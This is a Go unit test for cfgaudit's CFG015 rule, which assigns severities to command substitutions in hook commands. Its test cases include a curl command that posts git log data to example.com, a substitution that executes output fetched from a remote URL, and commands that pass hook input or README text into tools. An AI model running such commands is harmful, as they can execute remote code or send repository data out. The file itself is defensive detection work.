// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

// #1201 option C: a substitution that reads nothing an attacker can write is
// info; hook input, $ARGUMENTS and repository text keep warn, the network
// keeps error.
func TestCFG015_Severity1201(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		want finding.Severity
	}{
		{`echo $(date -u +%FT%TZ)`, finding.Info},
		{`$(command -v python3) x.py`, finding.Info},
		{`cd "$(ls -d "$HOME/.cache/tool"/*/ | sort -V | tail -n1)"`, finding.Info},
		{`d="$CLAUDE_PROJECT_DIR"; cd "$(dirname "$d")"`, finding.Info},
		{`curl -d "{\"m\": \"$(git log --oneline -1)\"}" https://example.com`, finding.Warn},
		{`git push origin $(git rev-parse --abbrev-ref HEAD)`, finding.Warn},
		{`tool $(jq -r .tool_input.command)`, finding.Warn},
		{`tool "$(cat README.md)"`, finding.Warn},
		{"!`echo $ARGUMENTS | wc -w`", finding.Warn},
		{`f=$(jq -r .tool_input.file_path); tool "$(basename $f)"`, finding.Warn},
		{`$(curl -s https://example.com)`, finding.Error},
	} {
		f := CFG015.Check(hookTarget(t, tc.cmd))
		if len(f) != 1 || f[0].Severity != tc.want {
			t.Errorf("%s: want one %s finding, got %+v", tc.cmd, tc.want, f)
		}
	}
}
